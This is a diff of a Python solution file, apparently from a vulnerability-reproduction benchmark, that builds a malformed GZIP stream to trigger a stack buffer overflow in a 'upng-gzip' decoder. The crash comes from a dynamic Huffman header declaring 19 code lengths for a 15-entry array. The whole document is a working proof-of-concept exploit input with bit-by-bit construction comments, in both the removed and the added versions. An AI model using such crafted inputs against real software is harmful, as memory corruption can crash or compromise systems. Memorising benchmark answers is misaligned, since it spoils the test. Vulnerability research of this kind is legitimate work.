@@ -1,29 +1,34 @@
-import sys
+import struct
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        """
-        Generate a PoC that triggers the stack buffer overflow in upng-gzip.
-        The vulnerability occurs because temporary arrays for Huffman code lengths are sized to 15,
-        but the format allows up to 19 code lengths. We construct a GZIP file with a dynamic Huffman
-        block specifying HCLEN=15 (which implies 19 codes), overflowing the buffer.
-        """
-        # GZIP Header (10 bytes): ID1=0x1f, ID2=0x8b, CM=8 (Deflate)
-        header = b'\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x00'
+        # GZIP Header (10 bytes)
+        # Magic (1f 8b), Method (08), Flags (00), MTime (00000000), XFL (00), OS (03)
+        header = b'\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x03'
         
-        # Deflate Payload Construction (LSB first bit stream):
-        # 1. Block Header: BFINAL=1, BTYPE=2 (Dynamic Huffman). Bits: 1, 0, 1
-        # 2. HLIT (5 bits): 0 (257 codes). Bits: 00000
-        #    -> Byte 0: 00000101 = 0x05
-        # 3. HDIST (5 bits): 0 (1 code). Bits: 00000
-        # 4. HCLEN (4 bits): 15 (19 code lengths). Bits: 1111
-        #    -> Byte 1: 111 (low 3 bits of HCLEN) | 00000 (HDIST) = 0xE0
-        #    -> Byte 2 starts with high 1 bit of HCLEN
-        # 5. Code Lengths: 19 codes * 3 bits = 57 bits. We set all to 0.
-        #    -> Byte 2: 1 (HCLEN high) | 0000000 (partial code lengths) = 0x01
-        #    -> Remaining bits: 57 - 7 (in Byte 2) = 50 bits needed.
-        #    -> 7 bytes of 0x00 provide 56 bits, sufficient to overflow.
+        # Deflate Payload (9 bytes)
+        # This payload constructs a Dynamic Huffman block with HCLEN=15.
+        # HCLEN=15 implies 19 code length codes will be read.
+        # The vulnerable implementation uses a fixed-size array of 15 for these codes.
+        # The order of code lengths is 16, 17, 18, 0, 8...
+        # The first code processed (index 16) triggers an Out-Of-Bounds write on the array (indices 0-14).
+        #
+        # Bitstream construction:
+        # Byte 0 (0x05): 
+        #   Bits 0-2: 101 (BFINAL=1, BTYPE=2 Dynamic)
+        #   Bits 3-7: 00000 (HLIT=0)
+        # Byte 1 (0xE0):
+        #   Bits 0-4: 00000 (HDIST=0)
+        #   Bits 5-7: 111 (Lower 3 bits of HCLEN=15)
+        # Byte 2 (0x01):
+        #   Bit 0: 1 (Upper bit of HCLEN=15)
+        #   Bits 1-3: 000 (Code Length for index 16) -> Writes to index 16 -> CRASH
+        #   Bits 4-7: 0... (Remaining bits, padded)
+        # Bytes 3-8: 0x00 (Padding to maintain stream validity/length)
+        payload = b'\x05\xE0\x01\x00\x00\x00\x00\x00\x00'
         
-        payload = b'\x05\xe0\x01' + b'\x00' * 7
+        # GZIP Footer (8 bytes)
+        # CRC32 (0) + ISIZE (0). Values irrelevant as crash occurs before check.
+        footer = b'\x00\x00\x00\x00\x00\x00\x00\x00'
         
-        return header + payload
+        return header + payload + footer
